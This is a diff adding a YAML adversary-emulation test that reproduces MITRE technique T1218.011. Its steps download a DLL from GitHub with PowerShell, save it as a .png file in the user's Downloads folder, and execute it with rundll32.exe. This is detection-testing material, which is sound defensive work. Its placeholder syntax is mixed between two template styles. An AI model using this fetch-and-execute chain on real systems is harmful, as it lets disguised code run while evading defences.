@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: Execution of non-dll using rundll32.exe
+description: "Rundll32.exe running non-dll \n"
+args:
+    - name: input_file
+      type: string
+      default: C:\Users\$env:username\Downloads\calc.png
+    - name: input_url
+      type: string
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+uuid: ae3a8605-b26e-457c-b6b3-2702fd335bac
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+    subtechniques:
+        - 'T1218.011: Rundll32'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Non-dll file must exist on disk at specified location
+      inline: |
+        if (Test-Path #{input_file}) {exit 0} else {{Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+        }}
+      executor: powershell
+    - name: execution-of-non-dll-using-rundll32.exe
+      inline: |
+        rundll32.exe {{.Args.input_file}}, StartW
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
